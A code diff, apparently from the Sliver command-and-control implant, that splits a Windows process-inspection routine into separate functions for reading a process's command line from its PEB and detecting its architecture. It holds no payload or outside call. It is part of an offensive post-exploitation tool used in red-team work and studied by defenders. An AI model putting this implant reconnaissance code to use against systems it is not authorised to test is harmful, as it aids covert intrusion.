@@ -7,6 +7,7 @@ import (
 	"fmt"
 	"github.com/bishopfox/sliver/implant/sliver/syscalls"
 	"golang.org/x/sys/windows"
+	"runtime"
 	"strings"
 	"syscall"
 	"unsafe"
@@ -62,7 +63,8 @@ func newWindowsProcess(e *syscall.ProcessEntry32) *WindowsProcess {
 	}
 	account, _ := getProcessOwner(e.ProcessID)
 	sessionID, _ := getSessionID(e.ProcessID)
-	cmdLine, arch, _ := getProcessInfo(e.ProcessID)
+	cmdLine, _ := getCmdLine(e.ProcessID)
+	arch, _ := getProcessArchitecture(e.ProcessID)
 
 	return &WindowsProcess{
 		pid:       int(e.ProcessID),
@@ -173,17 +175,17 @@ func main() {
 	fmt.Println(uintptrToBytes(&u))
 }
 
-func getProcessInfo(pid uint32) ([]string, string, error) {
+func getCmdLine(pid uint32) ([]string, error) {
 	handle, err := syscall.CreateToolhelp32Snapshot(syscall.TH32CS_SNAPMODULE, pid)
 	if err != nil {
-		return []string{}, "", err
+		return []string{}, err
 	}
 	defer syscall.CloseHandle(handle)
 
 	var module syscalls.MODULEENTRY32W
 	module.DwSize = uint32(unsafe.Sizeof(module))
 	if err = syscalls.Module32FirstW(windows.Handle(handle), &module); err != nil {
-		return []string{}, "", err
+		return []string{}, err
 	}
 
 	proc, err := syscall.OpenProcess(
@@ -192,7 +194,7 @@ func getProcessInfo(pid uint32) ([]string, string, error) {
 		pid,
 	)
 	if err != nil {
-		return strings.Fields(syscall.UTF16ToString(module.SzExePath[:])), "", err
+		return strings.Fields(syscall.UTF16ToString(module.SzExePath[:])), err
 	}
 
 	var info windows.PROCESS_BASIC_INFORMATION
@@ -204,7 +206,7 @@ func getProcessInfo(pid uint32) ([]string, string, error) {
 		nil,
 	)
 	if err != nil {
-		return strings.Fields(syscall.UTF16ToString(module.SzExePath[:])), "", err
+		return strings.Fields(syscall.UTF16ToString(module.SzExePath[:])), err
 	}
 
 	var peb windows.PEB
@@ -216,7 +218,7 @@ func getProcessInfo(pid uint32) ([]string, string, error) {
 		nil,
 	)
 	if err != nil {
-		return strings.Fields(syscall.UTF16ToString(module.SzExePath[:])), "", err
+		return strings.Fields(syscall.UTF16ToString(module.SzExePath[:])), err
 	}
 
 	var params windows.RTL_USER_PROCESS_PARAMETERS
@@ -228,7 +230,7 @@ func getProcessInfo(pid uint32) ([]string, string, error) {
 		nil,
 	)
 	if err != nil {
-		return strings.Fields(syscall.UTF16ToString(module.SzExePath[:])), "", err
+		return strings.Fields(syscall.UTF16ToString(module.SzExePath[:])), err
 	}
 
 	var cmdLine []uint16 = make([]uint16, params.CommandLine.Length)
@@ -240,28 +242,76 @@ func getProcessInfo(pid uint32) ([]string, string, error) {
 		nil,
 	)
 	if err != nil {
-		return strings.Fields(syscall.UTF16ToString(module.SzExePath[:])), "", err
+		return strings.Fields(syscall.UTF16ToString(module.SzExePath[:])), err
 	}
 
 
-	var arch string
+	err = syscall.CloseHandle(proc)
+	if err != nil {
+		return strings.Fields(syscall.UTF16ToString(module.SzExePath[:])), err
+	}
+
+	return strings.Fields(syscall.UTF16ToString(module.SzExePath[:]) + " : " + syscall.UTF16ToString(cmdLine[:])), nil
+}
+
+var nativeArch string = ""
+var nativeArchLookup bool = true
+
+func getProcessArchitecture(pid uint32) (string, error) {
+
+	if nativeArchLookup {
+		nativeArchLookup = false
+		if runtime.GOARCH == "amd64" {
+			nativeArch = "x86_64"
+		} else {
+			var is64Bit bool
+			pHandle, _ := windows.GetCurrentProcess()
+			if uint(pHandle) == 0 {
+				nativeArch = ""
+			} else if err := windows.IsWow64Process(pHandle, &is64Bit); err != nil {
+				nativeArch = ""
+			} else {
+				if !is64Bit {
+					nativeArch = "x86"
+				} else {
+					nativeArch = "x86_64"
+				}
+			}
+		}
+	}
+
+	proc, err := syscall.OpenProcess(
+		windows.PROCESS_QUERY_INFORMATION,
+		false,
+		pid,
+	)
+	if err != nil {
+		proc, err = syscall.OpenProcess(
+			windows.PROCESS_QUERY_LIMITED_INFORMATION,
+			false,
+			pid,
+		)
+		if err != nil {
+			return "", err
+		}
+	}
+
+	arch := ""
 	var isWow64 bool
-	if err := windows.IsWow64Process(windows.Handle(proc), &isWow64); err != nil {
-		arch = ""
-	} else {
+	if err := windows.IsWow64Process(windows.Handle(proc), &isWow64); err == nil {
 		if isWow64 {
 			arch = "x86"
 		} else {
-			arch = "x86_64"
+			arch = nativeArch
 		}
 	}
 
 	err = syscall.CloseHandle(proc)
 	if err != nil {
-		return strings.Fields(syscall.UTF16ToString(module.SzExePath[:])), "", err
+		return "", err
 	}
 
-	return strings.Fields(syscall.UTF16ToString(module.SzExePath[:]) + " : " + syscall.UTF16ToString(cmdLine[:])), arch, nil
+	return arch, err
 }
 
 func getSessionID(pid uint32) (int, error) {
